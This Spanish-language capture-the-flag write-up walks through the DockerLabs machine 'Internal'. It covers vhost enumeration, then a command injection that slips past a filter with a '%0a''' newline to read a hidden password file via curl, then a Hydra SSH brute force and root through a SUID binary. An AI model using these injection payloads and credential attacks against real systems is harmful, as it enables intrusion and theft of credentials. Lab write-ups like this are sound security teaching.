---
title: "DockerLabs - Internal"
difficulty: "Fácil"
source: "DockerLabs"
---

Internal es una máquina de DockerLabs orientada a la enumeración web y reconocimiento de servicios en red local.

## Despliegue

```bash
bash auto_deploy.sh internal.tar
```

## Reconocimiento

Lanzamos un escaneo de red para visualizar los puertos abiertos:

```bash
nmap -sV -p- 172.17.0.3
```

El escaneo revela dos servicios activos: **SSH** y **Apache**.

Al acceder al servicio web, Apache realiza una redirección hacia el dominio `internal.dl`, que no resuelve correctamente y devuelve error. Para poder acceder, añadimos la entrada correspondiente al fichero `/etc/hosts`:

```bash
echo "172.17.0.3 internal.dl" >> /etc/hosts
```

## Enumeración web

Al resolver el dominio y acceder a `http://internal.dl` encontramos una aplicación web titulada **"Military-Grade Backup & Vault System"**. La interfaz presenta:

- Botón **ACCESS VAULT** — acceso al sistema de almacenamiento
- Botón **ITEM LOG** — registro de elementos
- Navegación con secciones: Dashboard, Reports, Inventory, Lost, Admin

## Enumeración de subdominios

La web principal no tiene rutas útiles — todos los links apuntan a `#`. El vector real es un **subdominio oculto** descubierto con gobuster en modo vhost:

```bash
gobuster vhost -u http://internal.dl -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -r
```

Se descubre: `backup.internal.dl`. Añadirlo al `/etc/hosts`:

```bash
# /etc/hosts
172.17.0.3 internal.dl backup.internal.dl
```

## Acceso inicial — Command Injection (backup.internal.dl)

En `http://backup.internal.dl` hay un gestor de backups. Interceptando con Wireshark se observa que el parámetro `dir` se pasa directamente a un `ls -lah` en el servidor.

El sistema filtra operadores básicos (`;`, `|`, `&`) — responde con "Request blocked" o "Dangerous command detected". El bypass es un salto de línea seguido de comillas vacías: `%0a''`

```bash
# Listar /opt → encuentra .vault_pass.txt y carpeta vaultlibs
curl "http://backup.internal.dl/?action=backup&dir=/opt%0a''"

# Leer el archivo de contraseñas con ruta absoluta
curl "http://backup.internal.dl/?action=backup&dir=/opt%0a''more%20/opt/.vault_pass.txt"
```

Contraseñas extraídas guardadas en `found-passwords.txt`. El directorio `/home` reveló el usuario `vault`. Ataque SSH:

```bash
hydra -l vault -P found-passwords.txt ssh://172.17.0.3 -I -f -t 4
```

Acceso obtenido como usuario `vault`.

**Nota:** existe también `/tmp/.vault_pass.txt` con el mismo contenido.

## Escalada de privilegios

Listando binarios con bit SUID:

```bash
find / -perm -4000 -ls 2>/dev/null
```

Se encuentra `/usr/local/bin/vaultctl` — SUID root, ejecutable solo por el grupo `vault`:

```
-rwsr-xr-- 1 root vault 16136 Feb 25 15:00 /usr/local/bin/vaultctl
```

Al ejecutarlo directamente escala a root:

```bash
/usr/local/bin/vaultctl
whoami  # root
```

## Conclusión

Máquina completada. Vector principal: enumeración de subdominios → command injection con bypass de filtros (`%0a''`) → extracción de credenciales → SSH como `vault` → escalada via SUID binary `vaultctl`.

Técnicas: virtual hosting, command injection, filter bypass, SUID abuse.
